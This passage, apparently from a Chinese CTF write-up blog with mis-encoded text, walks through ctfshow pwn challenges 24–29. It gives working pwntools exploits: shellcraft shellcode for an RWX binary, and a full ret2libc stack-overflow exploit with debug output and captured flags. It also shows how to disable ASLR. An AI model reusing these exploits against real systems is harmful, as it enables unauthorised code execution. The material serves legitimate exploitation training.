href="#é¢˜ç›®æç¤ºä½¿ç”¨pwntoolsçš„shellcraftæ¨¡å—è¿›è¡Œæ”»å‡»ï¼Œå› æ­¤ç›´æ¥ç¼–å†™exp" class="headerlink" title="é¢˜ç›®æç¤ºä½¿ç”¨pwntoolsçš„shellcraftæ¨¡å—è¿›è¡Œæ”»å‡»ï¼Œå› æ­¤ç›´æ¥ç¼–å†™exp"></a>é¢˜ç›®æç¤ºä½¿ç”¨pwntoolsçš„shellcraftæ¨¡å—è¿›è¡Œæ”»å‡»ï¼Œå› æ­¤ç›´æ¥ç¼–å†™exp</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,28274)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line">ctfshow@ubuntu:~/Desktop$ python</span><br><span class="line">Python 2.7.17 (default, Mar  8 2023, 18:40:28) </span><br><span class="line">[GCC 7.5.0] on linux2</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; p = remote(&quot;pwn.challenge.ctf.show&quot;,28274)</span><br><span class="line">[x] Opening connection to pwn.challenge.ctf.show on port 28274</span><br><span class="line">[x] Opening connection to pwn.challenge.ctf.show on port 28274: Trying 124.223.158.81</span><br><span class="line">[+] Opening connection to pwn.challenge.ctf.show on port 28274: Done</span><br><span class="line">&gt;&gt;&gt; payload = asm(shellcraft.sh())</span><br><span class="line">&gt;&gt;&gt; p.sendline(payload)</span><br><span class="line">&gt;&gt;&gt; p.interactive()</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    â–„â–„â–„â–„   â–„â–„â–„â–„â–„â–„â–„â–„  â–„â–„â–„â–„â–„â–„â–„â–„            â–„â–„                           </span><br><span class="line">  â–ˆâ–ˆâ–€â–€â–€â–€â–ˆ  â–€â–€â–€â–ˆâ–ˆâ–€â–€â–€  â–ˆâ–ˆâ–€â–€â–€â–€â–€â–€            â–ˆâ–ˆ                           </span><br><span class="line"> â–ˆâ–ˆâ–€          â–ˆâ–ˆ     â–ˆâ–ˆ        â–„â–„â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–„  â–ˆâ–ˆâ–„â–ˆâ–ˆâ–ˆâ–ˆâ–„   â–„â–ˆâ–ˆâ–ˆâ–ˆâ–„  â–ˆâ–ˆ      â–ˆâ–ˆ</span><br><span class="line"> â–ˆâ–ˆ           â–ˆâ–ˆ     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–„â–„â–„â–„ â–€  â–ˆâ–ˆâ–€   â–ˆâ–ˆ  â–ˆâ–ˆâ–€  â–€â–ˆâ–ˆ â–€â–ˆ  â–ˆâ–ˆ  â–ˆâ–€</span><br><span class="line"> â–ˆâ–ˆâ–„          â–ˆâ–ˆ     â–ˆâ–ˆ         â–€â–€â–€â–€â–ˆâ–ˆâ–„  â–ˆâ–ˆ    â–ˆâ–ˆ  â–ˆâ–ˆ    â–ˆâ–ˆ  â–ˆâ–ˆâ–„â–ˆâ–ˆâ–„â–ˆâ–ˆ </span><br><span class="line">  â–ˆâ–ˆâ–„â–„â–„â–„â–ˆ     â–ˆâ–ˆ     â–ˆâ–ˆ        â–ˆâ–„â–„â–„â–„â–„â–ˆâ–ˆ  â–ˆâ–ˆ    â–ˆâ–ˆ  â–€â–ˆâ–ˆâ–„â–„â–ˆâ–ˆâ–€  â–€â–ˆâ–ˆ  â–ˆâ–ˆâ–€ </span><br><span class="line">    â–€â–€â–€â–€      â–€â–€     â–€â–€         â–€â–€â–€â–€â–€â–€   â–€â–€    â–€â–€    â–€â–€â–€â–€     â–€â–€  â–€â–€  </span><br><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- å…¥é—¨                              </span><br><span class="line">    * Type  : Linux_Security_Mechanisms                               </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : NX disabled &amp; Has RWX segments                          </span><br><span class="line">    * *************************************                           </span><br><span class="line">jhh///sh/binï¿½ï¿½hâ€¢â€¢â€¢â€¢ï¿½4$riâ€¢â€¢1ï¿½Qjâ€¢Yâ€¢ï¿½Qï¿½ï¿½1ï¿½j</span><br><span class="line">                                        XÍ€</span><br><span class="line">ï¿½ï¿½ï¿½F</span><br><span class="line">ls</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">ctfshow_flag</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">pwn</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">start.sh</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line">cat ctfshow_flag</span><br><span class="line">ctfshow&#123;c9ed6187-a6c6-40ae-a2b6-77d5a628be4b&#125;</span><br></pre></td></tr></table></figure><h3 id="pwn25"><a href="#pwn25" class="headerlink" title="pwn25"></a>pwn25</h3><h5 id="å¼€å¯NXä¿æŠ¤ï¼Œæˆ–è®¸å¯ä»¥è¯•è¯•ret2libc"><a href="#å¼€å¯NXä¿æŠ¤ï¼Œæˆ–è®¸å¯ä»¥è¯•è¯•ret2libc" class="headerlink" title="å¼€å¯NXä¿æŠ¤ï¼Œæˆ–è®¸å¯ä»¥è¯•è¯•ret2libc"></a><strong>å¼€å¯NXä¿æŠ¤ï¼Œæˆ–è®¸å¯ä»¥è¯•è¯•ret2libc</strong></h5><p><a href="https://wiki.wgpsec.org/knowledge/ctf/re2libc.html">https://wiki.wgpsec.org/knowledge/ctf/re2libc.html</a></p><p>ä½ å¯ä»¥ä½¿ç”¨pwntoolsçš„shellcraftæ¨¡å—æ¥è¿›è¡Œæ”»å‡»</p><p>32ä½ç¨‹åºï¼Œä½¿ç”¨IDAåç¼–è¯‘ï¼Œçœ‹åˆ°è¯»å…¥çš„bufä¸º132ä¸ªé•¿åº¦ï¼Œè€Œread()å‡½æ•°é™åˆ¶æˆ‘ä»¬è¯»å…¥çš„é•¿åº¦ä½0x100ï¼Œä¹Ÿå°±æ˜¯256ä¸ªé•¿åº¦ï¼Œæ‰€ä»¥ctfshow()å‡½æ•°å­˜åœ¨æ ˆæº¢å‡ºã€‚</p><p><img src="C:/Users/17687/AppData/Roaming/Typora/typora-user-images/image-20240527164637420.png?lastModify=1726473725" alt="image-20240527164637420"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">ctfshow@ubuntu:~/Desktop$ objdump -d -j .plt pwn</span><br><span class="line"></span><br><span class="line">pwn:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">08048370 &lt;.plt&gt;:</span><br><span class="line"> 8048370:   ff 35 04 a0 04 08       pushl  0x804a004</span><br><span class="line"> 8048376:   ff 25 08 a0 04 08       jmp    *0x804a008</span><br><span class="line"> 804837c:   00 00                   add    %al,(%eax)</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">08048380 &lt;read@plt&gt;:</span><br><span class="line"> 8048380:   ff 25 0c a0 04 08       jmp    *0x804a00c</span><br><span class="line"> 8048386:   68 00 00 00 00          push   $0x0</span><br><span class="line"> 804838b:   e9 e0 ff ff ff          jmp    8048370 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">08048390 &lt;puts@plt&gt;:</span><br><span class="line"> 8048390:   ff 25 10 a0 04 08       jmp    *0x804a010</span><br><span class="line"> 8048396:   68 08 00 00 00          push   $0x8</span><br><span class="line"> 804839b:   e9 d0 ff ff ff          jmp    8048370 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">080483a0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 80483a0:   ff 25 14 a0 04 08       jmp    *0x804a014</span><br><span class="line"> 80483a6:   68 10 00 00 00          push   $0x10</span><br><span class="line"> 80483ab:   e9 c0 ff ff ff          jmp    8048370 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">080483b0 &lt;write@plt&gt;:</span><br><span class="line"> 80483b0:   ff 25 18 a0 04 08       jmp    *0x804a018</span><br><span class="line"> 80483b6:   68 18 00 00 00          push   $0x18</span><br><span class="line"> 80483bb:   e9 b0 ff ff ff          jmp    8048370 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">080483c0 &lt;setvbuf@plt&gt;:</span><br><span class="line"> 80483c0:   ff 25 1c a0 04 08       jmp    *0x804a01c</span><br><span class="line"> 80483c6:   68 20 00 00 00          push   $0x20</span><br><span class="line"> 80483cb:   e9 a0 ff ff ff          jmp    8048370 &lt;.plt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨cyclicè®¡ç®—æ ˆåç§»é‡ï¼Œå¾—å‡ºæ ˆåç§»é‡ä¸º140</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ctfshow@ubuntu:~/Desktop$ cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">ctfshow@ubuntu:~/Desktop$ cyclic -l 0x6261616b</span><br><span class="line">140</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨objdumpæŸ¥çœ‹pltè¡¨ä¸­çš„å‡½æ•°ï¼Œæˆ‘ä»¬çœ‹åˆ°pltè¡¨ä¸­æœ‰putså‡½æ•°ä¹Ÿæœ‰writeå‡½æ•°ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨putså‡½æ•°æ¥è¾“å‡ºå‡½æ•°çš„å†…å­˜åœ°å€ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">ctfshow@ubuntu:~/Desktop$ objdump -d -j .plt pwn</span><br><span class="line"></span><br><span class="line">pwn:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">08048370 &lt;.plt&gt;:</span><br><span class="line"> 8048370:ff 35 04 a0 04 08    pushl  0x804a004</span><br><span class="line"> 8048376:ff 25 08 a0 04 08    jmp    *0x804a008</span><br><span class="line"> 804837c:00 00                add    %al,(%eax)</span><br><span class="line">...</span><br><span class="line">#######</span><br><span class="line">08048380 &lt;read@plt&gt;:</span><br><span class="line"> 8048380:ff 25 0c a0 04 08    jmp    *0x804a00c</span><br><span class="line"> 8048386:68 00 00 00 00       push   $0x0</span><br><span class="line"> 804838b:e9 e0 ff ff ff       jmp    8048370 &lt;.plt&gt;</span><br><span class="line">########</span><br><span class="line">08048390 &lt;puts@plt&gt;:</span><br><span class="line"> 8048390:ff 25 10 a0 04 08    jmp    *0x804a010</span><br><span class="line"> 8048396:68 08 00 00 00       push   $0x8</span><br><span class="line"> 804839b:e9 d0 ff ff ff       jmp    8048370 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">080483a0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 80483a0:ff 25 14 a0 04 08    jmp    *0x804a014</span><br><span class="line"> 80483a6:68 10 00 00 00       push   $0x10</span><br><span class="line"> 80483ab:e9 c0 ff ff ff       jmp    8048370 &lt;.plt&gt;</span><br><span class="line"> </span><br><span class="line"> #######</span><br><span class="line">080483b0 &lt;write@plt&gt;:</span><br><span class="line"> 80483b0:ff 25 18 a0 04 08    jmp    *0x804a018</span><br><span class="line"> 80483b6:68 18 00 00 00       push   $0x18</span><br><span class="line"> 80483bb:e9 b0 ff ff ff       jmp    8048370 &lt;.plt&gt;</span><br><span class="line"></span><br><span class="line">080483c0 &lt;setvbuf@plt&gt;:</span><br><span class="line"> 80483c0:ff 25 1c a0 04 08    jmp    *0x804a01c</span><br><span class="line"> 80483c6:68 20 00 00 00       push   $0x20</span><br><span class="line"> 80483cb:e9 a0 ff ff ff       jmp    8048370 &lt;.plt&gt;</span><br></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"> </span><br><span class="line">p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28278)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;/home/ctfshow/libc/32bit/libc-2.27.so&#x27;)</span><br><span class="line"> </span><br><span class="line">offset = 0x88 + 0x4  # æº¢å‡ºåç§»åœ°å€</span><br><span class="line">main_addr = elf.symbols[&#x27;main&#x27;]  # mainå‡½æ•°åœ°å€</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]  # pltè¡¨ä¸­putså‡½æ•°åœ°å€</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]  # gotè¡¨ä¸­putså‡½æ•°åœ°å€</span><br><span class="line"> </span><br><span class="line"># payloadï¼š0x88+0x4ä¸ªæ— ç”¨å¡«å……å­—ç¬¦è¦†ç›–åˆ°è¿”å›åœ°å€ï¼Œ</span><br><span class="line"># å°†putså‡½æ•°pltè¡¨åœ°å€åšè¿”å›åœ°å€ï¼Œä»£è¡¨ctfshowå‡½æ•°æ‰§è¡Œå®Œä¼šæ‰§è¡Œputså‡½æ•°ï¼Œ</span><br><span class="line"># main_addræ˜¯putså‡½æ•°æ‰§è¡Œå®Œåçš„è¿”å›åœ°å€ï¼Œä½¿ç”¨putså‡½æ•°æ‰§è¡Œå®Œåå›åˆ°mainå‡½æ•°ç»§ç»­åˆ©ç”¨æº¢å‡ºæ¼æ´</span><br><span class="line"># putså‡½æ•°gotè¡¨ä¸­çš„åœ°å€ä½œä¸ºputså‡½æ•°æ‰§è¡Œçš„å‚æ•°ï¼Œè®©putså‡½æ•°è¾“å‡ºputså‡½æ•°åœ¨å†…å­˜çš„åœ°å€</span><br><span class="line">payload = offset * &#x27;a&#x27; + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line"># å‘é€payload</span><br><span class="line">p.sendline(payload)</span><br><span class="line"># æ¥æ”¶putså‡½æ•°è¾“å‡ºçš„putså‡½æ•°åœ¨å†…å­˜çš„åœ°å€</span><br><span class="line">puts_addr = u32(p.recv()[0:4])</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"> </span><br><span class="line"># åœ¨æ ¹æ®å†…å­˜ä¸­putså‡½æ•°çš„åœ°å€å¯»æ‰¾ç›¸åº”çš„libcç‰ˆæœ¬ä¸­putså‡½æ•°çš„åœ°å€</span><br><span class="line">libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">print(hex(libc_base))</span><br><span class="line"> </span><br><span class="line"># è®¡ç®— system å‡½æ•°çš„åœ°å€</span><br><span class="line">system_addr = libc_base + libc.symbols[&#x27;system&#x27;]</span><br><span class="line"> </span><br><span class="line"># è®¡ç®— &quot;/bin/sh&quot; å­—ç¬¦ä¸²çš„åœ°å€</span><br><span class="line">binsh_addr = libc_base + next(libc.search(&#x27;/bin/sh&#x27;))</span><br><span class="line"> </span><br><span class="line"># æ„é€  payload å‘é€ç»™ç¨‹åº</span><br><span class="line">payload = offset * &#x27;a&#x27; + p32(system_addr) + &#x27;aaaa&#x27; + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br><span class="line">ctfshow@ubuntu:~/Desktop$ python 11.py</span><br><span class="line">[+] Opening connection to pwn.challenge.ctf.show on port 28278: Done</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] &#x27;/home/ctfshow/libc/32bit/libc-2.27.so&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[DEBUG] Sent 0x99 bytes:</span><br><span class="line">    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  â”‚aaaaâ”‚aaaaâ”‚aaaaâ”‚aaaaâ”‚</span><br><span class="line">    *</span><br><span class="line">    00000080  61 61 61 61  61 61 61 61  61 61 61 61  90 83 04 08  â”‚aaaaâ”‚aaaaâ”‚aaaaâ”‚Â·Â·Â·Â·â”‚</span><br><span class="line">    00000090  2d 86 04 08  10 a0 04 08  0a                        â”‚-Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·â”‚</span><br><span class="line">    00000099</span><br><span class="line">[DEBUG] Received 0x11 bytes:</span><br><span class="line">    00000000  60 13 df f7  90 2d da f7  b6 83 04 08  c0 1a df f7  â”‚`Â·Â·Â·â”‚Â·-Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚</span><br><span class="line">    00000010  0a                                                  â”‚Â·â”‚</span><br><span class="line">    00000011</span><br><span class="line">0xf7df1360</span><br><span class="line">0xf7d8a000</span><br><span class="line">[DEBUG] Sent 0x99 bytes:</span><br><span class="line">    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  â”‚aaaaâ”‚aaaaâ”‚aaaaâ”‚aaaaâ”‚</span><br><span class="line">    *</span><br><span class="line">    00000080  61 61 61 61  61 61 61 61  61 61 61 61  10 6d dc f7  â”‚aaaaâ”‚aaaaâ”‚aaaaâ”‚Â·mÂ·Â·â”‚</span><br><span class="line">    00000090  61 61 61 61  cf 58 f0 f7  0a                        â”‚aaaaâ”‚Â·XÂ·Â·â”‚Â·â”‚</span><br><span class="line">    00000099</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">[DEBUG] Sent 0x9 bytes:</span><br><span class="line">    &#x27;cat flag\n&#x27;</span><br><span class="line">[DEBUG] Received 0x2e bytes:</span><br><span class="line">    &#x27;ctfshow&#123;8b046493-c3e3-4c64-bcd0-3e78fe5b80d2&#125;\n&#x27;</span><br><span class="line">ctfshow&#123;8b046493-c3e3-4c64-bcd0-3e78fe5b80d2&#125;</span><br></pre></td></tr></table></figure><h3 id="pwn26"><a href="#pwn26" class="headerlink" title="pwn26"></a>pwn26</h3><h4 id="ä»€ä¹ˆæ˜¯ASLR"><a href="#ä»€ä¹ˆæ˜¯ASLR" class="headerlink" title="ä»€ä¹ˆæ˜¯ASLR"></a>ä»€ä¹ˆæ˜¯ASLR</h4><p>å¤§å¤šæ•°çš„æ”»å‡»éƒ½åŸºäºè¿™æ ·ä¸€ä¸ªå‰æï¼Œå³æ”»å‡»è€…çŸ¥é“ç¨‹åºçš„å†…å­˜å¸ƒå±€ï¼Œéœ€è¦æå‰çŸ¥é“shellcodeæˆ–è€…å…¶ä»–ä¸€äº›æ•°æ®çš„ä½ç½®ã€‚å› æ­¤ï¼Œå¼•å…¥å†…å­˜å¸ƒå±€çš„éšæœºåŒ–èƒ½å¤Ÿæœ‰æ•ˆå¢åŠ æ¼æ´åˆ©ç”¨çš„éš¾åº¦ï¼Œå…¶ä¸­ä¸€ç§æŠ€æœ¯å°±æ˜¯ASLRï¼ˆAddress Space Layout Randomizationï¼‰ã€‚ASLRæä¾›çš„åªæ˜¯æ¦‚ç‡ä¸Šçš„å®‰å…¨æ€§ï¼Œæ ¹æ®ç”¨äºéšæœºåŒ–çš„ç†µï¼Œæ”»å‡»è€…æœ‰å¯èƒ½å¹¸è¿åœ°çŒœåˆ°æ­£ç¡®çš„åœ°å€ï¼Œæœ‰æ—¶æ”»å‡»è€…è¿˜å¯ä»¥çˆ†ç ´ã€‚</p><p>åœ¨Linuxä¸Šï¼ŒASLRçš„å…¨å±€é…ç½®&#x2F;proc&#x2F;sts&#x2F;kernel&#x2F;randomize_va_spaceæœ‰ä¸‰ç§æƒ…å†µï¼š0è¡¨ç¤ºå…³é—­ASLRï¼›1è¡¨ç¤ºéƒ¨åˆ†å¼€å¯ï¼ˆå°†mmapçš„åŸºå€ï¼Œstackå’Œvdsoé¡µé¢éšæœºåŒ–ï¼‰ï¼›2è¡¨ç¤ºå®Œå…¨å¼€å¯ï¼ˆåœ¨éƒ¨åˆ†å¼€å¯çš„åŸºç¡€ä¸Šå¢åŠ heapçš„éšæœºåŒ–ï¼‰ã€‚å¦‚ä¸‹ï¼š åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° æˆ‘ä»¬å¯ä»¥ä¿®æ”¹&#x2F;proc&#x2F;sts&#x2F;kernel&#x2F;randomize_va_spaceæ–‡ä»¶çš„å€¼æ¥é…ç½®ASLRã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">./pwn</span><br></pre></td></tr></table></figure><h3 id="pwn27"><a href="#pwn27" class="headerlink" title="pwn27"></a>pwn27</h3><p>è¿™é“é¢˜ç›®ç›¸è¾ƒäºä¸Šé“é¢˜ç›®ï¼Œæ˜¯&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_spaceè¿™ä¸ªæ–‡ä»¶çš„å†…å®¹ä¸º0æˆ–è€…1éƒ½å¯ä»¥å¾—åˆ°æ­£ç¡®çš„flagã€‚ç”±äºæˆ‘ä»¬åœ¨ä¸Šåˆ°é¢˜ç›®ä¸­å·²ç»æŠŠ&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_spaceè¿™ä¸ªæ–‡ä»¶ä¸­çš„å†…å®¹æ”¹ä¸ºäº†0ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥è¿è¡Œpwnæ–‡ä»¶å°±èƒ½æ‹¿åˆ°flagäº†ã€‚</p><h3 id="pwn28"><a href="#pwn28" class="headerlink" title="pwn28"></a>pwn28</h3><p>è¿™é“é¢˜ç›®æ¯”å‰ä¸¤é“é¢˜å¥½åƒè¿˜ç®€å•ï¼Œä»€ä¹ˆé™åˆ¶éƒ½æ²¡æœ‰ï¼Œç›´æ¥è¿è¡Œå°±èƒ½æ‹¿flagï¼Œå¤©å¤§çš„å¥½äº‹å‘€ï¼ï¼ï¼</p><h3 id="pwn29"><a href="#pwn29" class="headerlink" title="pwn29"></a>pwn29</h3><h4 id="ä»€ä¹ˆæ˜¯PIE"><a href="#ä»€ä¹ˆæ˜¯PIE" class="headerlink" title="ä»€ä¹ˆæ˜¯PIE"></a>ä»€ä¹ˆæ˜¯PIE</h4><p>ç”±äºASLRæ˜¯ä¸€ç§æ“ä½œç³»ç»Ÿå±‚é¢çš„æŠ€æœ¯ï¼Œè€ŒäºŒè¿›åˆ¶ç¨‹åºæœ¬èº«æ˜¯ä¸æ”¯æŒéšæœºåŒ–åŠ è½½çš„ï¼Œä¾¿å‡ºç°äº†ä¸€äº›ç»•è¿‡æ–¹æ³•ï¼Œä¾‹å¦‚ret2pltã€GOTåŠ«æŒã€åœ°å€çˆ†ç ´ç­‰ã€‚äºæ˜¯ï¼Œäººä»¬äº2003å¹´å¼•å…¥äº†ä½ç½®æ— å…³å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆPosition-Independent Executableï¼ŒPIEï¼‰ã€‚å®ƒåœ¨åº”ç”¨å±‚çš„ç¼–è¯‘å™¨å®ç°ï¼Œé€šè¿‡å°†ç¨‹åºç¼–è¯‘ä¸ºä½ç½®æ— å…³ä»£ç ï¼ˆPosition-Independent Codeï¼ŒPICï¼‰ï¼Œä½¿ç¨‹åºå¯ä»¥è¢«åŠ è½½åˆ°ä»»æ„ä½ç½®ï¼Œå°±åƒæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å…±äº«åº“ã€‚åœ¨PIEå’ŒASLRåŒæ—¶å¼€å¯çš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å°†å¯¹ç¨‹åºçš„å†…å­˜å¸ƒå±€ä¸€æ— æ‰€çŸ¥ï¼Œå¤§å¤§å¢åŠ 